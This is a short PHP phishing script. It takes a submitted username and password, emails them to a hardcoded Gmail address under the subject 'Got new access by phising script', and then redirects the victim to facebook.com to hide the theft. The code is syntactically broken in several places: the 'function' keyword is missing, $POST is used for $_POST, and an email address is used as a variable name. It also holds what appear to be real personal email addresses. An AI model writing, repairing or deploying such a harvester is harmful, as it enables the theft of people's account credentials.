<?php
	mail_sender(){
		$username = $POST['vmthalapthy2204@gmail.com'];
		$password = $POST['password'];
		
		$reciever = "vmchems2204@gmail.com";
		
		$subject = "Got new access by phising script";
		$message = "The username is ". $vmthalapthy2204@gmail.com;
		$message .= "and password is ". $password;
		
		return mail($reciever, $subject, $message);
	}
	
	if(mail_sender()){
		header("Location: http://www.facebook.com");
	}
?>
